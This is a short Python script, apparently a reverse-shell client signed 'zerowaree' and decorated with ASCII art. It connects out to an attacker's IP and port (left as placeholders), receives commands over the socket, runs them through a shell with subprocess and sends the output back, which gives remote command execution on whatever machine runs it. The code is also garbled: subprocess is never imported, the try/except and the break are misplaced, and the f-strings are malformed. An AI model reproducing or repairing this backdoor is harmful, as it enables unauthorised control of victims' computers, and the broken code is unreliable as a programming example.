import time
import socket
import colorama
from colorama import Fore, Back, Style
colorama.init()

cliente=socket.socket()
try:
    cliente.connect(("youriphere",porthere))
    cliente.send("1".encode("ascii"))
    
    while True:
        comandoBytes=cliente.recv(1024)
        comandoCodificado=comandoBytes.decode("ascii")
        comando=subprocess.Popen(comandoCodificado,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
        cliente.send(comando.stdout.read())
    except:
        print(f{Fore_RED}"[-] Something went wrong [-]")
        print(f{Fore_CYAN}"[!] Press Any key to exit [!]")
    input()
    break

#                       .,,uod8B8bou,,.
#              ..,uod8BBBBBBBBBBBBBBBBRPFT?l!i:.
#         ,=m8BBBBBBBBBBBBBBBRPFT?!||||||||||||||
#         !...:!TVBBBRPFT||||||||||!!^^""'   ||||
#         !.......:!?|||||!!^^""'            ||||
#         !.........||||                     ||||
#         !.........||||  ##                 ||||
#         !.........||||                     ||||
#         !.........||||                     ||||
#         !.........||||                     ||||
#         !.........||||                     ||||
#         `.........||||                    ,||||
#          .;.......||||               _.-!!|||||
#   .,uodWBBBBb.....||||       _.-!!|||||||||!:'
# !YBBBBBBBBBBBBBBb..!|||:..-!!|||||||!iof68BBBBBb....
# !..YBBBBBBBBBBBBBBb!!||||||||!iof68BBBBBBRPFT?!::   `.
# !....YBBBBBBBBBBBBBBbaaitf68BBBBBBRPFT?!:::::::::     `.
# !......YBBBBBBBBBBBBBBBBBBBRPFT?!::::::;:!^"`;:::       `.
# !........YBBBBBBBBBBRPFT?!::::::::::^''...::::::;         iBBbo.
# `..........YBRPFT?!::::::::::::::::::::::::;iof68bo.      WBBBBbo.
#  `..........:::::::::::::::::::::::;iof688888888888b.     `YBBBP^'
#    `........::::::::::::::::;iof688888888888888888888b.     `
#      `......:::::::::;iof688888888888888888888888888888b.
#        `....:::;iof688888888888888888888888888888888899fT!
#          `..::!8888888888888888888888888888888899fT|!^"'
#            `' !!988888888888888888888888899fT|!^"'
#                `!!8888888888888888899fT|!^"'
#                  `!988888888899fT|!^"'
#                    `!9899fT|!^"'
#                      `!^"'
# --> Made with love, by zerowaree
